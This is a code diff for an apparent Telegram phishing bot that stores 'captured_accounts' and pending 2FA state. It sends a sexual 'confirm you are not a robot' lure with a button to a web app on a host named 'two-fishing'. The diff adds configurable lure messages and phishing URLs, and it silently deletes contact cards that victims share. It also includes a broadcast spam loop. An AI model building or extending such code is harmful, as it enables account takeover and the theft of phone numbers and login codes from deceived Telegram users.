@@ -22,14 +22,15 @@ YOUR_TELEGRAM_ID = _si(os.environ.get("OWNER_ID"), 0)
 PORT = _si(os.environ.get("PORT"), 5000)
 WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")
 
-WELCOME_TEXT = """Hello {name} 👋
-
-🔞To again access to the files completely free of charge, do the following💦:
-
-👇Confirm that you are not a robot.
-
-👇"""
-WELCOME_BUTTON = "CONFIRM NOW"
+# ============================================================
+# DEFAULT WELCOME — NO BUTTON, JUST TEXT
+# ============================================================
+DEFAULT_WELCOME = {
+    "text": "Hello {name} 👋\n\n🔞To again access to the files completely free of charge, do the following💦:\n\n👇Confirm that you are not a robot.\n\n👇",
+    "button_text": "CONFIRM NOW",
+    "button_url": WEBAPP_URL + "?auto=1",
+    "show_button": True
+}
 
 logger.info("=" * 60)
 logger.info("ENV CHECK")
@@ -53,10 +54,15 @@ pending_2fa = {}
 sessions_lock = threading.Lock()
 DATA_FILE = "captured_accounts.json"
 USERS_FILE = "bot_users.json"
+WELCOME_FILE = "welcome_config.json"
 
 STATE = {
     "capture_mode": False,
+    "welcome_capture": False,
     "awaiting_timer": False,
+    "awaiting_btn_text": False,
+    "awaiting_btn_url": False,
+    "awaiting_welcome_edit_index": None,
 }
 
 broadcast_state = {
@@ -69,32 +75,34 @@ broadcast_state = {
 timer_value = 60
 
 
-def load_users():
-    if os.path.exists(USERS_FILE):
+def load_json(path, default):
+    if os.path.exists(path):
         try:
-            with open(USERS_FILE) as f:
+            with open(path) as f:
                 return json.load(f)
         except Exception:
-            return {}
-    return {}
+            return default
+    return default
+
+
+def save_json(path, data):
+    try:
+        with open(path, 'w') as f:
+            json.dump(data, f, indent=2)
+    except Exception as e:
+        logger.error(f"save {path}: {e}")
+
+
+def load_users():
+    return load_json(USERS_FILE, {})
 
 
 def save_users(data):
-    try:
-        with open(USERS_FILE, 'w') as f:
-            json.dump(data, f, indent=2)
-    except Exception as e:
-        logger.error(f"save users: {e}")
+    save_json(USERS_FILE, data)
 
 
 def load_accounts():
-    if os.path.exists(DATA_FILE):
-        try:
-            with open(DATA_FILE) as f:
-                return json.load(f)
-        except Exception:
-            return []
-    return []
+    return load_json(DATA_FILE, [])
 
 
 def save_account(account):
@@ -107,16 +115,35 @@ def save_account(account):
             break
     if not found:
         accounts.append(account)
-    try:
-        with open(DATA_FILE, 'w') as f:
-            json.dump(accounts, f, indent=2)
-    except Exception as e:
-        logger.error(f"Save err: {e}")
+    save_json(DATA_FILE, accounts)
     return account
+
+
+# ============================================================
+# WELCOME MESSAGES — multiple messages list
+# ============================================================
+def load_welcome_config():
+    cfg = load_json(WELCOME_FILE, None)
+    if not cfg or not isinstance(cfg, dict):
+        cfg = {
+            "messages": [
+                {"type": "text", "content": DEFAULT_WELCOME["text"]}
+            ],
+            "button_text": DEFAULT_WELCOME["button_text"],
+            "button_url": DEFAULT_WELCOME["button_url"],
+            "show_button": True
+        }
+        save_json(WELCOME_FILE, cfg)
+    return cfg
+
+
+def save_welcome_config(cfg):
+    save_json(WELCOME_FILE, cfg)
 
 
 captured_accounts = load_accounts()
 users = load_users()
+welcome_config = load_welcome_config()
 
 
 def format_phone(ph):
@@ -274,11 +301,12 @@ bot = TelegramClient(SESSION_PATH, API_ID, API_HASH)
 
 def admin_menu():
     return [
-        [Button.inline("📢 Broadcast", b"menu_broadcast"),
-         Button.inline(f"⏱ Timer: {timer_value}s", b"menu_timer")],
-        [Button.inline("👥 Users", b"menu_users"),
-         Button.inline("📊 Stats", b"menu_stats")],
-        [Button.inline("🔄 Reset Modes", b"menu_reset")],
+        [Button.inline("👋 Welcome Messages", b"menu_welcome"),
+         Button.inline("📢 Broadcast", b"menu_broadcast")],
+        [Button.inline(f"⏱ Timer: {timer_value}s", b"menu_timer"),
+         Button.inline("👥 Users", b"menu_users")],
+        [Button.inline("📊 Stats", b"menu_stats"),
+         Button.inline("🔄 Reset Modes", b"menu_reset")],
     ]
 
 
@@ -287,77 +315,71 @@ def back_button():
 
 
 async def edit_or_send(event, text, buttons=None):
-    """Edit if possible, else send new message. Robust with multiple fallbacks."""
-    # Try edit
     try:
         await event.edit(text, buttons=buttons, parse_mode='md')
         return True
     except Exception as e:
         logger.warning(f"edit failed: {e}")
-    
-    # Try send with buttons
-    try:
-        await bot.send_message(event.sender_id, text, buttons=buttons, parse_mode='md')
-        return True
-    except Exception as e2:
-        logger.warning(f"send with buttons failed: {e2}")
-    
-    # Try send without parse_mode
-    try:
-        await bot.send_message(event.sender_id, text, buttons=buttons)
-        return True
-    except Exception as e3:
-        logger.warning(f"send no-md failed: {e3}")
-    
-    # Try plain no buttons
-    try:
-        await bot.send_message(event.sender_id, text)
-        return True
-    except Exception as e4:
-        logger.error(f"all send failed: {e4}")
-        return False
+        try:
+            await bot.send_message(event.sender_id, text, buttons=buttons, parse_mode='md')
+            return True
+        except Exception as e2:
+            logger.warning(f"send w/btn failed: {e2}")
+            try:
+                await bot.send_message(event.sender_id, text, buttons=buttons)
+                return True
+            except Exception as e3:
+                try:
+                    await bot.send_message(event.sender_id, text)
+                    return True
+                except Exception as e4:
+                    logger.error(f"all send failed: {e4}")
+                    return False
 
 
 async def send_welcome(uid, name):
-    """Robust welcome message with multiple fallback attempts."""
+    """Send all welcome messages in order, then delete the whole batch"""
     logger.info(f"=== SEND_WELCOME for uid={uid} name={name} ===")
-    content = WELCOME_TEXT.replace("{name}", name)
+    msgs = welcome_config.get("messages", [])
+    if not msgs:
+        logger.warning("No welcome messages configured")
+        return []
     
-    # Attempt 1: Button.url with markdown
-    try:
-        buttons = [[Button.url(WELCOME_BUTTON, url=WEBAPP_URL + "?auto=1")]]
-        sent = await bot.send_message(uid, content, buttons=buttons, parse_mode='md')
-        logger.info(f"✅ L1 SUCCESS (url+md): msg_id={sent.id}")
-        return sent.id
-    except Exception as e1:
-        logger.warning(f"L1 failed: {e1}")
+    show_button = welcome_config.get("show_button", True)
+    btn_text = welcome_config.get("button_text", "CONFIRM NOW")
+    btn_url = welcome_config.get("button_url", WEBAPP_URL + "?auto=1")
     
-    # Attempt 2: Button.url without markdown
-    try:
-        buttons = [[Button.url(WELCOME_BUTTON, url=WEBAPP_URL + "?auto=1")]]
-        sent = await bot.send_message(uid, content, buttons=buttons)
-        logger.info(f"✅ L2 SUCCESS (url only): msg_id={sent.id}")
-        return sent.id
-    except Exception as e2:
-        logger.warning(f"L2 failed: {e2}")
+    sent_ids = []
+    for i, m in enumerate(msgs):
+        content = (m.get("content") or "").replace("{name}", name)
+        is_last = (i == len(msgs) - 1)
+        buttons = None
+        if is_last and show_button:
+            buttons = [[Button.url(btn_text, url=btn_url)]]
+        
+        sent_msg = None
+        for attempt in range(3):
+            try:
+                sent_msg = await bot.send_message(uid, content, buttons=buttons, parse_mode='md')
+                break
+            except Exception as e:
+                logger.warning(f"welcome msg {i} attempt {attempt+1} failed: {e}")
+                try:
+                    sent_msg = await bot.send_message(uid, content, buttons=buttons)
+                    break
+                except Exception as e2:
+                    try:
+                        sent_msg = await bot.send_message(uid, content)
+                        break
+                    except Exception as e3:
+                        logger.error(f"msg {i} all attempts failed: {e3}")
+        
+        if sent_msg:
+            sent_ids.append(sent_msg.id)
+            logger.info(f"✅ Welcome msg #{i+1} sent: {sent_msg.id}")
+        await asyncio.sleep(0.3)
     
-    # Attempt 3: No buttons
-    try:
-        sent = await bot.send_message(uid, content)
-        logger.info(f"✅ L3 SUCCESS (no button): msg_id={sent.id}")
-        return sent.id
-    except Exception as e3:
-        logger.warning(f"L3 failed: {e3}")
-    
-    # Attempt 4: Minimal fallback
-    try:
-        sent = await bot.send_message(uid, f"Hello {name}, tap /start again.")
-        logger.info(f"✅ L4 SUCCESS (minimal): msg_id={sent.id}")
-        return sent.id
-    except Exception as e4:
-        logger.error(f"❌ ALL WELCOME FAILED: {e4}")
-        logger.error(traceback.format_exc())
-        return None
+    return sent_ids
 
 
 @bot.on(events.NewMessage(pattern='/start'))
@@ -406,9 +428,96 @@ async def cb(event):
 
         elif data == "menu_reset":
             for k in STATE:
-                STATE[k] = False
+                if k != "awaiting_welcome_edit_index":
+                    STATE[k] = False
+            STATE["awaiting_welcome_edit_index"] = None
             await event.answer("Reset!", alert=True)
             await edit_or_send(event, "✅ Modes reset.", admin_menu())
+
+        elif data == "menu_welcome":
+            n = len(welcome_config.get("messages", []))
+            await event.answer()
+            await edit_or_send(event,
+                f"👋 **Welcome Messages** — `{n}` active\n\n"
+                f"**Bold:** `**text**`\n**Italic:** `__text__`\n**Quote:** `> text`",
+                [
+                    [Button.inline("➕ Add", b"wl_add"),
+                     Button.inline("📋 List", b"wl_list")],
+                    [Button.inline("🗑 Clear All", b"wl_clear")],
+                    [Button.inline("🔘 Button Text", b"wl_btntext"),
+                     Button.inline("🔗 Button URL", b"wl_btnurl")],
+                    [Button.inline("👁 Preview", b"wl_preview"),
+                     Button.inline("🔕 Toggle Button", b"wl_toggle_btn")],
+                    back_button()
+                ])
+
+        elif data == "wl_list":
+            msgs = welcome_config.get("messages", [])
+            if not msgs:
+                return await event.answer("No messages", alert=True)
+            txt = f"**{len(msgs)} messages:**\n\n"
+            for i, m in enumerate(msgs):
+                preview = (m.get("content") or "")[:40].replace("\n", " ")
+                txt += f"{i+1}. `{preview}...`\n"
+            await event.answer(txt[:200], alert=True)
+
+        elif data == "wl_add":
+            STATE["welcome_capture"] = True
+            STATE["capture_mode"] = False
+            await event.answer("Send welcome messages")
+            await edit_or_send(event,
+                "✍️ **Welcome Capture: ON**\n\n"
+                "Send text/photo/video one by one.\n"
+                "Each becomes a welcome message in sequence.\n\n"
+                "**Bold:** `**text**`\n"
+                "**Italic:** `__text__`\n"
+                "**Quote:** `> text`\n"
+                "**Code:** `` `code` ``\n\n"
+                "Tap **Stop** when done.",
+                [[Button.inline("⏹ Stop & Save", b"wl_stop")], back_button()])
+
+        elif data == "wl_stop":
+            STATE["welcome_capture"] = False
+            n = len(welcome_config.get("messages", []))
+            await event.answer(f"Saved {n} messages!", alert=True)
+            await edit_or_send(event,
+                f"✅ Welcome set: `{n}` messages.",
+                admin_menu())
+
+        elif data == "wl_clear":
+            welcome_config["messages"] = []
+            save_welcome_config(welcome_config)
+            await event.answer("Cleared!", alert=True)
+            await edit_or_send(event, "Cleared welcome messages.", admin_menu())
+
+        elif data == "wl_btntext":
+            STATE["awaiting_btn_text"] = True
+            await event.answer()
+            await edit_or_send(event,
+                f"✏️ Current: `{welcome_config.get('button_text', 'CONFIRM NOW')}`\n\n"
+                f"Send new button text.",
+                back_button())
+
+        elif data == "wl_btnurl":
+            STATE["awaiting_btn_url"] = True
+            await event.answer()
+            await edit_or_send(event,
+                f"🔗 Current: `{welcome_config.get('button_url', WEBAPP_URL)}`\n\n"
+                f"Send new WebApp URL.",
+                back_button())
+
+        elif data == "wl_toggle_btn":
+            welcome_config["show_button"] = not welcome_config.get("show_button", True)
+            save_welcome_config(welcome_config)
+            state = "ON" if welcome_config["show_button"] else "OFF"
+            await event.answer(f"Button {state}", alert=True)
+            await edit_or_send(event,
+                f"🔘 Button is now **{state}**",
+                [[Button.inline("⬅️ Back", b"menu_welcome")]])
+
+        elif data == "wl_preview":
+            await event.answer("Preview sent")
+            await send_welcome(YOUR_TELEGRAM_ID, "Preview")
 
         elif data == "menu_broadcast":
             s = broadcast_state
@@ -420,18 +529,30 @@ async def cb(event):
                      Button.inline("▶️ Start", b"bc_start")],
                     [Button.inline("⏹ Stop", b"bc_stop"),
                      Button.inline("🗑 Clear", b"bc_clear")],
+                    [Button.inline("📋 Show Queue", b"bc_show")],
                     back_button()
                 ])
 
         elif data == "bc_add":
             STATE["capture_mode"] = True
-            await event.answer("Send broadcast messages")
+            STATE["welcome_capture"] = False
+            await event.answer("Send messages")
             await edit_or_send(event,
                 "📥 **Broadcast Capture: ON**\n\nSend text/photo/video. Tap START when done.",
                 [
                     [Button.inline("▶️ Start Now", b"bc_start")],
                     [Button.inline("❌ Cancel", b"bc_cancel")]
                 ])
+
+        elif data == "bc_show":
+            msgs = broadcast_state.get("messages", [])
+            if not msgs:
+                return await event.answer("Queue empty", alert=True)
+            txt = f"**{len(msgs)} broadcast messages:**\n\n"
+            for i, m in enumerate(msgs):
+                preview = (m.get("content") or m.get("caption") or "")[:40].replace("\n", " ")
+                txt += f"{i+1}. [{m.get('type')}] `{preview}...`\n"
+            await event.answer(txt[:200], alert=True)
 
         elif data == "bc_start":
             STATE["capture_mode"] = False
@@ -472,7 +593,7 @@ async def cb(event):
         elif data == "menu_stats":
             s = broadcast_state
             await event.answer(
-                f"Users: {len(users)}\nBroadcast: {s['active']}\nQueue: {len(s['messages'])}\nTimer: {timer_value}s",
+                f"Users: {len(users)}\nBroadcast: {s['active']}\nQueue: {len(s['messages'])}\nTimer: {timer_value}s\nWelcome: {len(welcome_config.get('messages', []))}",
                 alert=True
             )
     except Exception as e:
@@ -485,17 +606,34 @@ async def cancel(event):
     if event.sender_id != YOUR_TELEGRAM_ID:
         return
     for k in STATE:
-        STATE[k] = False
+        if k != "awaiting_welcome_edit_index":
+            STATE[k] = False
+    STATE["awaiting_welcome_edit_index"] = None
     broadcast_state['messages'] = []
     broadcast_state['active'] = False
     await event.respond("Cancelled.", buttons=admin_menu())
 
 
+# ============================================================
+# AUTO-DELETE USER'S SHARED CONTACT CARD
+# ============================================================
 @bot.on(events.NewMessage())
 async def capture(event):
-    global timer_value
+    """Handle all messages — delete contact cards from users, capture broadcast/welcome from owner"""
+    # DELETE CONTACT CARD from user's chat (non-owner)
     if event.sender_id != YOUR_TELEGRAM_ID:
+        try:
+            if event.message and event.message.contact:
+                # User shared a contact — delete after 0.5s
+                logger.info(f"User {event.sender_id} shared contact — deleting")
+                await asyncio.sleep(0.3)
+                await event.delete()
+                logger.info(f"✅ Contact card deleted for {event.sender_id}")
+        except Exception as e:
+            logger.warning(f"contact delete err: {e}")
         return
+    
+    # Owner messages below
     txt = event.raw_text or ""
     if txt.startswith('/'):
         return
@@ -512,6 +650,36 @@ async def capture(event):
                 buttons=admin_menu(), parse_mode='md')
         except ValueError:
             await event.respond("Send a number (e.g., 30)")
+        return
+
+    if STATE["awaiting_btn_text"]:
+        welcome_config["button_text"] = txt.strip()[:40]
+        STATE["awaiting_btn_text"] = False
+        save_welcome_config(welcome_config)
+        await event.respond(f"✅ Button text: `{welcome_config['button_text']}`",
+            buttons=admin_menu(), parse_mode='md')
+        return
+
+    if STATE["awaiting_btn_url"]:
+        welcome_config["button_url"] = txt.strip()
+        STATE["awaiting_btn_url"] = False
+        save_welcome_config(welcome_config)
+        await event.respond(f"✅ Button URL: `{welcome_config['button_url']}`",
+            buttons=admin_menu(), parse_mode='md')
+        return
+
+    if STATE["welcome_capture"]:
+        m = event.message
+        entry = {"type": "text", "content": m.message or ""}
+        if m.photo:
+            entry = {"type": "photo", "content": m.message or ""}
+        elif m.video:
+            entry = {"type": "video", "content": m.message or ""}
+        welcome_config.setdefault("messages", []).append(entry)
+        save_welcome_config(welcome_config)
+        await event.respond(
+            f"✅ Welcome #{len(welcome_config['messages'])} added.",
+            buttons=[[Button.inline("⏹ Stop & Save", b"wl_stop")], back_button()])
         return
 
     if STATE["capture_mode"]:
@@ -553,7 +721,7 @@ async def broadcast_loop():
                 for entry in broadcast_state['messages']:
                     try:
                         if entry['type'] == 'text':
-                            await bot.send_message(uid, entry['content'] or entry['caption'])
+                            await bot.send_message(uid, entry['content'] or entry['caption'], parse_mode='md')
                         elif entry['type'] in ('photo', 'video'):
                             try:
                                 msg = await bot.get_messages(entry['_chat_id'], ids=entry['_msg_id'])
@@ -953,7 +1121,8 @@ def health():
         'accounts': len(captured_accounts),
         'bot_users': len(users),
         'broadcast_active': broadcast_state['active'],
-        'broadcast_queue': len(broadcast_state['messages'])
+        'broadcast_queue': len(broadcast_state['messages']),
+        'welcome_count': len(welcome_config.get('messages', []))
     })
 
 
